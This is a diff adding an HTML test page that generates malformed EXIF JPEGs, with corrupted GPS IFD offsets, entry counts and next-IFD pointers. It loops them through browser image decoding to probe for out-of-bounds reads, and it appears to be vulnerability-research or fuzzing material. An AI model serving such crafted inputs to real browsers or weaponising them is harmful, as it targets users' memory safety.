@@ -1,0 +1,54 @@
+<!doctype html>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>GPS-EXIF-TEST</title>
+<body style="background:#000;color:#0f0;font:13px monospace;white-space:pre-wrap;margin:8px">
+<div id=o>[GPS-EXIF-TEST] GPSCopy offset-confusion probe</div>
+<script>
+const o=document.getElementById('o');
+const log=m=>{o.textContent+="\n"+m;};
+window.addEventListener('error',e=>log("[ERR] "+e.message));
+log("[*] start");
+
+// Build a bare EXIF JPEG: SOI + APP1(Exif) + EOI. No image frame — targets metadata parse path.
+function buildJpeg(ifd0Count, gpsTag, gpsType, gpsCount, gpsVal){
+  const payload=[0x45,0x78,0x69,0x66,0x00,0x00,              // "Exif\0\0"
+                 0x49,0x49,0x2A,0x00,0x08,0x00,0x00,0x00];   // TIFF LE, IFD0 @8
+  const ifd0=[ifd0Count&0xFF,(ifd0Count>>8)&0xFF,             // entry count
+    gpsTag&0xFF,(gpsTag>>8)&0xFF, gpsType&0xFF,(gpsType>>8)&0xFF,
+    gpsCount&0xFF,(gpsCount>>8)&0xFF,(gpsCount>>16)&0xFF,(gpsCount>>>24)&0xFF,
+    gpsVal&0xFF,(gpsVal>>8)&0xFF,(gpsVal>>16)&0xFF,(gpsVal>>>24)&0xFF,
+    0x00,0x00,0x00,0x00];                                     // next IFD = 0
+  const app1Len=payload.length+ifd0.length+2;
+  const jpg=[0xFF,0xD8, 0xFF,0xE1, app1Len>>8, app1Len&0xFF, ...payload, ...ifd0, 0xFF,0xD9];
+  return new Uint8Array(jpg);
+}
+
+const VARS=[
+ ["A nextIFD=FFFFFFFF (orig)", 0x0001, 0x8825, 4, 1, 0xFFFFFFFF],
+ ["B gpsOff=0x7FFFFFF0 (past EOF)", 0x0001, 0x8825, 4, 1, 0x7FFFFFF0],
+ ["C ifd0count=FFFF (entry OOB)", 0xFFFF, 0x8825, 4, 1, 0x1A],
+ ["D huge count+off (read OOB)", 0x0001, 0x8825, 4, 0x40000001, 0x00000008],
+];
+
+(async()=>{
+  let pass=0;
+  while(true){
+    pass++;
+    for(const [name,cnt,tag,ty,n,val] of VARS){
+      log("pass="+pass+" "+name);
+      const blob=new Blob([buildJpeg(cnt,tag,ty,n,val)],{type:"image/jpeg"});
+      try{ await createImageBitmap(blob); log("  bitmap ok"); }catch(e){ log("  bitmap "+e.name); }
+      try{ await createImageBitmap(blob,{imageOrientation:"from-image"}); log("  orient ok"); }catch(e){ log("  orient "+e.name); }
+      const url=URL.createObjectURL(blob);
+      const img=new Image();
+      img.onload=()=>log("  img onload "+img.naturalWidth+"x"+img.naturalHeight);
+      img.onerror=()=>log("  img onerror");
+      img.src=url;
+      await new Promise(r=>setTimeout(r,300));
+      URL.revokeObjectURL(url);
+    }
+    log("--- pass "+pass+" done ---");
+    await new Promise(r=>setTimeout(r,500));
+  }
+})();
+</script>
